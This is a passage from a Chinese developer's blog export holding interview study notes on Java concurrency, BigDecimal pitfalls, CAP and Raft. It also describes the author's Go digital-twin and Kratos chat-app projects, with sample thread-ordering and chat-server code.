title="如何防止内存泄漏"></a>如何防止内存泄漏</h3></li></ol><ul><li>内存泄漏是由于 ThreadLocalMap 中的 Entry 没有被及时清理导致的</li></ul><ol><li>使用完 ThreadLocal 后及时调用 remove() 方法</li><li>使用 try-with-resources 或 try-finally 块，在finally释放资源</li><li>使用InheritableThreadLocal<h2 id="26-BigDecimal避坑"><a href="#26-BigDecimal避坑" class="headerlink" title="26. BigDecimal避坑"></a>26. BigDecimal避坑</h2></li><li>使用浮点数初始化时，使用valueOf()，而不是使用new Bigdecimal()：valueof()内部先转换string再初始化</li><li>使用equals时，精度（scale）不同也返回false；使用compareTo方法，-1小于，0等于，1大于</li><li>divide时，指定一个结果精度，避免无限循环抛出arith异常；使用RoundingMode类选四舍五入等<h2 id="27-阻塞队列BQ，类似于channel"><a href="#27-阻塞队列BQ，类似于channel" class="headerlink" title="27. 阻塞队列BQ，类似于channel"></a>27. 阻塞队列BQ，类似于channel</h2></li></ol><ul><li>特点1:队列为空，读进程阻塞</li><li>特点2:队列为满，写进程阻塞</li></ul><ol><li>ArrayBlockingQueue</li><li>LinkedBlockingQueue</li><li>PriorityBlockingQueue<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3></li><li>生产消费者模型</li><li>线程池任务队列</li><li>线程同步问题：goroutine，多个线程可以共享一个阻塞队列<h2 id="28-守护线程和普通线程的区别"><a href="#28-守护线程和普通线程的区别" class="headerlink" title="28. 守护线程和普通线程的区别"></a>28. 守护线程和普通线程的区别</h2><h2 id="29-启动线程使用start，而不是用run"><a href="#29-启动线程使用start，而不是用run" class="headerlink" title="29. 启动线程使用start，而不是用run"></a>29. 启动线程使用start，而不是用run</h2></li><li>start方法告诉jvm新建了一个线程，并在新线程中执行与run方法相关联的代码块</li><li>run方法仅是一个方法调用，没有新线程创建<h2 id="30-java的线程如何通信"><a href="#30-java的线程如何通信" class="headerlink" title="30. java的线程如何通信"></a>30. java的线程如何通信</h2></li><li>共享内存：使用volatile保证共享变量的可见性</li><li>消息传递：消息队列/管道/信号量<h2 id="31-线程调度算法【抢占式算法】"><a href="#31-线程调度算法【抢占式算法】" class="headerlink" title="31. 线程调度算法【抢占式算法】"></a>31. 线程调度算法【抢占式算法】</h2>线程优先级是如何设定的？<h2 id="32-死锁与活锁，饥饿是什么"><a href="#32-死锁与活锁，饥饿是什么" class="headerlink" title="32. 死锁与活锁，饥饿是什么"></a>32. 死锁与活锁，饥饿是什么</h2></li><li><strong>死锁</strong>是进程间互斥且一直等待对方释放资源，都无法继续执行的情况</li><li><strong>活锁</strong>是运行状态下，多个线程不断地改变自己的状态以回应对方，但最终无法取得进展，导致线程不断重试相同的操作，却无法成功</li><li><strong>饥饿</strong>,一个比较宽泛的概念，指一个或多个线程或进程由于某种原因无法获得所需的资源或执行机会</li></ol><h2 id="33-什么时候进入waiting状态"><a href="#33-什么时候进入waiting状态" class="headerlink" title="33. 什么时候进入waiting状态"></a>33. 什么时候进入waiting状态</h2><ol><li>等待获取锁的时候</li><li>等待IO时</li><li>使用Object.wait()方法，等待其他线程调用同对象的notify和notifyall方法唤醒</li><li>使用Thread.join()，使当前线程等待目标线程的结束，目标线程结束后，当前线程被唤醒</li><li>使用LockSupport.park()，使当前线程等待，直到获取LockSupport指定的许可或者线程被中断、调度。<h3 id="为什么wait和notify要在同步块中调用"><a href="#为什么wait和notify要在同步块中调用" class="headerlink" title="为什么wait和notify要在同步块中调用"></a>为什么wait和notify要在同步块中调用</h3></li></ol><p><strong>同步块提供了互斥性</strong></p><ul><li>希望同一时刻只有一个线程能执行wait/notify，避免并发修改问题，不在互斥时进行wait/notify会导致错误的上下文，还有导致竞争状态<h2 id="36-自动拆箱导致的-空指针-问题"><a href="#36-自动拆箱导致的-空指针-问题" class="headerlink" title="36. 自动拆箱导致的 空指针 问题"></a>36. 自动拆箱导致的 空指针 问题</h2>数据库的查询结果可能是 null，因为自动拆箱，用基本数据类型接收有 NPE 风险.<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/javajob.assets/51eb094e11b71dfeff75f93e99dc7856.png" alt title>                </div>                <div class="image-caption"></div>            </figure>减少自动拆箱问题<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/javajob.assets/10f950d32f14aa81d0677156837572c5.png" alt title>                </div>                <div class="image-caption"></div>            </figure></li></ul><h2 id="35-线程安全如何实现【加锁，原子操作，ThreadLocal减少共享资源，线程安全的设计模式】"><a href="#35-线程安全如何实现【加锁，原子操作，ThreadLocal减少共享资源，线程安全的设计模式】" class="headerlink" title="35. 线程安全如何实现【加锁，原子操作，ThreadLocal减少共享资源，线程安全的设计模式】"></a>35. 线程安全如何实现【加锁，原子操作，ThreadLocal减少共享资源，线程安全的设计模式】</h2><ul><li>线程安全的设计模式：使用单例模式中的双重检查锁定<br>实现，其实就是线程安全的singleton<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h2 id="34-三个线程如何顺序执行"><a href="#34-三个线程如何顺序执行" class="headerlink" title="34. 三个线程如何顺序执行"></a>34. 三个线程如何顺序执行</h2><ol><li>思路是2等1的锁，3等2的锁，1等3的锁。实现用join和LockSupport的park和unpark方法。</li><li>CountDownLatch。设置初始计数为 2，分别在 T1 和 T2 的线程内等待计数器减少到 0，然后释放 T3 线程。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Thread T1 = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">    <span class="comment">// 线程 T1 的任务</span></span><br><span class="line">&#125;);</span><br><span class="line">Thread T2 = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        T1.join(); <span class="comment">// 等待 T1 执行完成</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 线程 T2 的任务</span></span><br><span class="line">&#125;);</span><br><span class="line">Thread T3 = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        T2.join(); <span class="comment">// 等待 T2 执行完成</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 线程 T3 的任务</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ol><p>LockSupport</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Thread t1;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Thread t2;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Thread t3;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    t1 = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">        System.out.println(<span class="string">"T1 is running."</span>);</span><br><span class="line">        LockSupport.unpark(t2); <span class="comment">// 唤醒线程T2</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    t2 = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">        LockSupport.park(); <span class="comment">// 阻塞线程T2</span></span><br><span class="line">        System.out.println(<span class="string">"T2 is running."</span>);</span><br><span class="line">        LockSupport.unpark(t3); <span class="comment">// 唤醒线程T3</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    t3 = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">        LockSupport.park(); <span class="comment">// 阻塞线程T3</span></span><br><span class="line">        System.out.println(<span class="string">"T3 is running."</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    t1.start();</span><br><span class="line">    t2.start();</span><br><span class="line">    t3.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CountDownLatch</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">CountDownLatch latch1 = <span class="keyword">new</span> CountDownLatch(<span class="number">1</span>);</span><br><span class="line">CountDownLatch latch2 = <span class="keyword">new</span> CountDownLatch(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Thread t1 = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">    System.out.println(<span class="string">"T1 running."</span>);</span><br><span class="line">    latch1.countDown(); <span class="comment">// T1 执行完后释放 latch1</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Thread t2 = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        latch1.await(); <span class="comment">// 等待 latch1 的释放</span></span><br><span class="line">      System.out.println(<span class="string">"T2 running."</span>);</span><br><span class="line">        latch2.countDown(); <span class="comment">// T2 执行完后释放 latch2</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Thread t3 = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        latch2.await(); <span class="comment">// 等待 latch2 的释放</span></span><br><span class="line">      System.out.println(<span class="string">"T3 running."</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">t1.start();</span><br><span class="line">t2.start();</span><br><span class="line">t3.start();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分布式理论</title>
      <link href="/2023/01/06/2023-01-06-%E9%9D%A2%E7%BB%8F%E5%88%86%E5%B8%83%E5%BC%8F/"/>
      <url>/2023/01/06/2023-01-06-%E9%9D%A2%E7%BB%8F%E5%88%86%E5%B8%83%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p> questions</p><a id="more"></a><h1 id="CAP理论"><a href="#CAP理论" class="headerlink" title="CAP理论"></a>CAP理论</h1><p><strong>Consistency（一致性）、Availability（可用性）、Partition Tolerance（分区容错性)</strong></p><h1 id="raft理论"><a href="#raft理论" class="headerlink" title="raft理论"></a>raft理论</h1><h2 id="leader选举、日志复制、日志压缩、成员变更"><a href="#leader选举、日志复制、日志压缩、成员变更" class="headerlink" title="leader选举、日志复制、日志压缩、成员变更"></a>leader选举、日志复制、日志压缩、成员变更</h2><ol><li>Leader Selection</li></ol><p>Raft使用 (心跳机制)来触发选举。当server节点启动时，初始状态都是 follower。每一个server都有一个定时器，超时时间为 (时间长 度一般为150ms~300ms)，如果某server没有超时的情况下收到来自leader或者 candidate的任何RPC，则定时器重启，如果超时，它就开始一次选举。leader给 followers发RPC要么复制日志，要么就是用来告诉followers自己是leader，不用选举的 心跳(告诉followers对状态机应用日志的消息夹杂在心跳中)。如果某个candidate获 得了超过半数节点的选票(自己投了自己)，就称为新leader</p><h3 id="如果leader节点出现了故障"><a href="#如果leader节点出现了故障" class="headerlink" title="如果leader节点出现了故障"></a>如果leader节点出现了故障</h3><p>用raft共识算法来做的</p><ol start="2"><li>Log Relocation</li></ol><p>leader 在每个 heartbeat 向 follower 发送AppendEntries RPC同步日志，follower如果发现没问题，复制成功后会 给leader一个表示成功的ACK，leader收到超过半数的ACK后应用该日志，返回客户 端执行结果。若 follower 节点宕机、运行缓慢或者丢包，则 leader 节点会不断重试 AppendEntries RPC，直到所有 follower 节点最终都复制所有日志条目。</p><p>乐观锁：<br>每个对象有一个版本号或者时间戳，当对象被修改时，版本号会更新。在提交更新时，检查版本号是否匹配，如果不匹配则说明有冲突发生，需要进行相应的处理。<br>悲观锁：<br>在操作对象时，先锁定该对象，其他用户无法修改该对象直到锁被释放。这种方法可以保证同时只有一个用户能够修改对象，但可能会导致并发性能下降。</p><ol><li>服务注册与发现 consul</li><li>负载均衡，consul，用wrr算法实现的</li><li>APi网关 gateway</li><li>熔断器 circuitbreaker</li></ol><h2 id="分布式session怎么做的，常用的"><a href="#分布式session怎么做的，常用的" class="headerlink" title="分布式session怎么做的，常用的"></a>分布式session怎么做的，常用的</h2><p>java有apach shiro这两个中间件有session管理器，它是配置redis共享缓存的服务器中的，使用的是RedisSessionDAO层。</p><p>golang有casbin+redis的共享缓存来实现分布式session管理</p><h2 id="身份认证和权限管理"><a href="#身份认证和权限管理" class="headerlink" title="身份认证和权限管理"></a>身份认证和权限管理</h2><p><a href="https://zhuanlan.zhihu.com/p/150644469" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/150644469</a></p><p><a href="https://www.cnblogs.com/alisapine/p/15080359.html" target="_blank" rel="noopener">https://www.cnblogs.com/alisapine/p/15080359.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 分布式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> 分布式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Project</title>
      <link href="/2023/01/06/2023-01-06-%E9%9D%A2%E8%AF%95%E9%A1%B9%E7%9B%AE/"/>
      <url>/2023/01/06/2023-01-06-%E9%9D%A2%E8%AF%95%E9%A1%B9%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<p>嘴太笨了</p><a id="more"></a><h2 id="Go数字孪生"><a href="#Go数字孪生" class="headerlink" title="Go数字孪生"></a>Go数字孪生</h2><p>项目背景：企业合作项目。负责设计开发数据采集与指令下发模块，实现车间物理设备与Unity模拟软件的实时状态映射。</p><p>这个项目是老师和<strong>科大讯飞与农科信创</strong>这个公司合作的一个数字化管理系统，这个项目虽然叫数字孪生但是您可以把它当作一个游戏前端+共享文档来看，客户端程序我们用的unity开发的，农科信创提供的了数字资产和传感器，科大讯飞提供了一部分深度学习模型，做的事包括产量预估、病虫害表型鉴定、采摘车的三维图像定位（通过ROS控制）、异常人员检测，这个项目我做的事就基于go做的后端，一个是监听、收集和预处理数据发送到模型端，一个是提供给unity接口支持多个用户去操作边缘设备（调整温度光照，要更改采摘车的采摘顺序），将模型处理后的统计数据、实体状态呈现给前端。</p><p>项目难点：根据传感器文档构建指令，指令是通过状态写入协议来进行的；处理多个用户操作同一个对象的冲突问题。</p><!-- ： 传感器数据发送到预测模型，处理的结果上传数据库，用户在unity客户端的指令，我要发送到边缘设备上更改前端unity可视化的作用。 --><ul><li>后端主要基于Gin和Zinx开发，连接Unity端收发实时数据，提供用户控制端Web服务接口</li><li>使用gRPC对序列化后的对象消息进行流式传输，保证服务器端与Unity端的高效同步</li><li>使用MongoDB存储服务器端的统计数据、历史设备指令与数字工厂状态的日志文件提供历史状态查询与回滚操作</li></ul><ol><li>gin做的是登陆认证、资产文件上分片上传/拉取功能，存储在mongodb，资产文件用gridFS。以及获取grpc通信的结构体解析成XML的功能，unity前端有一个功能是鼠标移动到实例上就有一个悬浮框显示所有属性</li><li>数据接收模块：传感器都是基于UDP的协议进行上传，频率有高有低，所以对一个传感器go了一个routine，在这个routine里接收解析所需的数据进行解析完，处理成结构体之后，用grpc的stream消息发到GPU服务器上部署的模型来处理。</li><li>用户在unity端的操作和指令下发是用zinx实现的，它是一个TCP长连接框架，然后服务器端去实现温度、土壤、种植区、采摘车这些实体对象与现实状态的同步，（比如控制土壤ph、二氧化碳浓度、控温、光谱开关、采摘车路线修正）包括位置、惯导的方位角，角速度线速度等（用MSO格式封装的报文），在用户端封装的控制指令以bytes的形式用zinx的DataPack封装，封装的控制指令转发到终端设备的service</li><li>如果有多个用户并发要对这个对象操作，在这个处理的goroutine中可能会造成冲突，我们维护了一个对象map，对这个map加锁处理，对于采摘车的话，是单独维护了一个处于三维坐标系下的对象。</li><li>用到channel的场景：一个预测服务中，对发送数据的goroutine是配套的，</li><li>历史状态查询的话，是根据mongo中存储各对象的历史状态，根据时间戳向前端的拉取。</li><li>是做用户在本地对传感器做操作后，连接的控制终端，比如采摘车的路径校准、和毫米波雷达的控制，主要包括DIFOP设备信息输出协议，用户配置写入协议UCWP</li><li>在服务器端连接mongodb，服务器数据收集、统计计算、上传数据库</li></ol><h2 id="Go-轻量聊天APP（Go-Kratos-GPT2）"><a href="#Go-轻量聊天APP（Go-Kratos-GPT2）" class="headerlink" title="Go 轻量聊天APP（Go/Kratos/GPT2）"></a>Go 轻量聊天APP（Go/Kratos/GPT2）</h2><p>项目角色：唯一贡献者<br>项目背景：该软件作为当时学习Go语言微服务框架与组件的个人练手项目。聊天以群组的形式进行，将基于GPT2的bot与聊天室服务拆分成微服务，主要包括用户信息服务、群组管理服务、消息传输服务、GPT会话存储服务四个。</p><ul><li>使用的微服务框架为Kratos，开发组件和工具主要包括Redis/Go-kit/Swagger</li><li>遵循微服务部署流程，微服务使用k8s部署，dlv调试工具，godoc自动化生成文档等</li></ul><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">用户表</span><br><span class="line">用户id，密码，密码哈希值，salt</span><br><span class="line">群组表</span><br><span class="line">群组id, 用户id, 权限值</span><br><span class="line">聊天记录表</span><br><span class="line">key：userid, groupid,timestamp做的索引</span><br></pre></td></tr></table></figure><h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><h2 id="用户信息服务"><a href="#用户信息服务" class="headerlink" title="用户信息服务"></a>用户信息服务</h2><ul><li>查看个人/他人信息功能</li><li>更改字段功能</li><li>增加删除(注销)功能<!-- - 登陆模块1：初始是获取MAC地址进行的，机器码和id作为key --></li><li>登陆模块：用户输入用户名、密码<ul><li>注册时提供密码，系统为用户生成唯一salt</li><li>将密码的字符串salt与原字符串拼接，得到hash</li><li>数据库存储 hash 和 salt</li><li>登陆时将字符串与salt连接后的到hash’，判断hash’ == hash</li><li>验证正确后，服务端使用jwt机制，进行API调用（库使用的jwt-go</li></ul></li><li>jwt优点<ul><li>更适用CDN: 可以通过内容分发网络请求你服务端的所有资料</li><li>Token机制在服务端不需要存储session信息，因为Token 自身包含了所有登录用户的信息，只需要在客户端的cookie或本地介质存储状态信息.</li><li>去耦: 不需要绑定到一个特定的身份验证方案。Token可以在任何地方生成，只要在你的API被调用的时候，你可以进行Token生成调用即可.</li><li>更适用于移动应用: 当你的客户端是一个原生平台（iOS, Android，Windows 8等）时，Cookie是不被支持的（你需要通过Cookie容器进行处理），这时采用Token认证机制就会简单得多。</li></ul></li></ul><h2 id="群组管理服务"><a href="#群组管理服务" class="headerlink" title="群组管理服务"></a>群组管理服务</h2><ul><li>邀请加入用户byID</li><li>踢出用户byID<h2 id="消息传输服务"><a href="#消息传输服务" class="headerlink" title="消息传输服务"></a>消息传输服务</h2></li><li>群组以聊天室为单位进行，一个聊天室对应一个Pod</li><li>主要包括ChatRoomClient和ChatRoomServer</li><li>ChatRoomClient 主要负责与前端通信和处理与当前用户相关的信息</li><li>ChatRoomServer 则负责维护所有在线用户信息以及处理消息的分发<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> ChatRoomClient <span class="keyword">struct</span> &#123;</span><br><span class="line">    roomId <span class="keyword">int</span></span><br><span class="line">    user User </span><br><span class="line">    conn net.Conn <span class="comment">//与前端维持的通信连接</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> ChatRoomServer <span class="keyword">struct</span> &#123;</span><br><span class="line">    clients <span class="keyword">map</span>[<span class="keyword">string</span>]*ChatRoomClient <span class="comment">// 维护一个连接池</span></span><br><span class="line">    rooms   <span class="keyword">map</span>[<span class="keyword">string</span>][]*ChatRoomClient <span class="comment">// 用于维护聊天室与客户端的关系</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// SendMessage 方法用于发送消息给聊天室</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *ChatRoomClient)</span> <span class="title">SendMessage</span><span class="params">(message <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    c.server.BroadcastMessage(c.RoomID, c.UserID, c.UserName, message)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Disconnect 方法处理客户端断开连接的情况</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *ChatRoomClient)</span> <span class="title">Disconnect</span><span class="params">()</span></span> &#123;</span><br><span class="line">    c.server.RemoveClient(c)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// NewChatRoomServer 方法用于创建一个新的ChatRoomServer对象</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewChatRoomServer</span><span class="params">()</span> *<span class="title">ChatRoomServer</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &amp;ChatRoomServer&#123;</span><br><span class="line">        clients: <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]*ChatRoomClient),</span><br><span class="line">        rooms:   <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>][]*ChatRoomClient),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// AddClient 方法将一个客户端添加到服务器</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *ChatRoomServer)</span> <span class="title">AddClient</span><span class="params">(client *ChatRoomClient)</span></span> &#123;</span><br><span class="line">    s.clients[client.ConnectionID] = client</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RemoveClient 方法将一个客户端从服务器移除</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *ChatRoomServer)</span> <span class="title">RemoveClient</span><span class="params">(client *ChatRoomClient)</span></span> &#123;</span><br><span class="line">    <span class="built_in">delete</span>(s.clients, client.ConnectionID)</span><br><span class="line">    <span class="comment">// 在此处也可以将客户端从对应的聊天室中移除</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// JoinRoom 方法将一个客户端加入到指定聊天室中</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *ChatRoomServer)</span> <span class="title">JoinRoom</span><span class="params">(client *ChatRoomClient, roomID <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    s.rooms[roomID] = <span class="built_in">append</span>(s.rooms[roomID], client)</span><br><span class="line">    client.RoomID = roomID</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// LeaveRoom 方法将一个客户端从指定聊天室中移除</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *ChatRoomServer)</span> <span class="title">LeaveRoom</span><span class="params">(client *ChatRoomClient, roomID <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    clients := s.rooms[roomID]</span><br><span class="line">    <span class="keyword">for</span> i, c := <span class="keyword">range</span> clients &#123;</span><br><span class="line">        <span class="keyword">if</span> c.ConnectionID == client.ConnectionID &#123;</span><br><span class="line">            <span class="comment">// 从聊天室中移除客户端</span></span><br><span class="line">            s.rooms[roomID] = <span class="built_in">append</span>(clients[:i], clients[i+<span class="number">1</span>:]...)</span><br><span class="line">            client.RoomID = <span class="string">""</span> <span class="comment">// 将客户端的聊天室ID清空</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// BroadcastMessage 方法向指定聊天室内的所有客户端广播消息</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *ChatRoomServer)</span> <span class="title">BroadcastMessage</span><span class="params">(roomID, userID, userName, message <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    clients := s.rooms[roomID]</span><br><span class="line">    <span class="keyword">for</span> _, client := <span class="keyword">range</span> clients &#123;</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(client *ChatRoomClient)</span></span> &#123;</span><br><span class="line">            <span class="comment">// 在协程中处理消息发送</span></span><br><span class="line">            client.SendMessage(userID, userName, message)</span><br><span class="line">        &#125;(client)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="消息传输的并发处理和消息分发问题是怎么解决的"><a href="#消息传输的并发处理和消息分发问题是怎么解决的" class="headerlink" title="消息传输的并发处理和消息分发问题是怎么解决的"></a>消息传输的并发处理和消息分发问题是怎么解决的</h3><p>消息发送时，一个客户端的sendmessage用一个goroutine进行</p><ul><li>可能出现的并发安全问题<ol><li>map互斥锁 在 ChatRoomServer 中的 rooms 和 clients 字典是共享的数据结构，多个goroutine可能会同时访问或修改这些数据结构，可能导致竞态条件（race condition）或数据不一致的问题。</li></ol></li></ul><h2 id="kratos进行微服务间的通信"><a href="#kratos进行微服务间的通信" class="headerlink" title="kratos进行微服务间的通信"></a>kratos进行微服务间的通信</h2><p>这些服务的通信都是一些很轻量的元数据，kratos的用protobuf定义的middleware</p><p>gRPC API 进行接口交互，服务架构需要使用统一的元信息（Metadata）传输进行微服务间的传递。 目前 gRPC 中可以携带元信息传递，原理是将元信息放入 HTTP Header 中，这样上游即可收到对应的元信息 信息。 因此在Kratos的设计上，也是通过 HTTP Header 进行传递。在框架中先将元信息包封装成key/value结构，然后携带到 Transport Header 中。</p><h2 id="服务注册"><a href="#服务注册" class="headerlink" title="服务注册"></a>服务注册</h2><p>创建一个 Registrar（以 consul 为例），将 Registrar 注入进 Kratos 应用实例中，Kratos 会自动完成实例注册和反注册</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 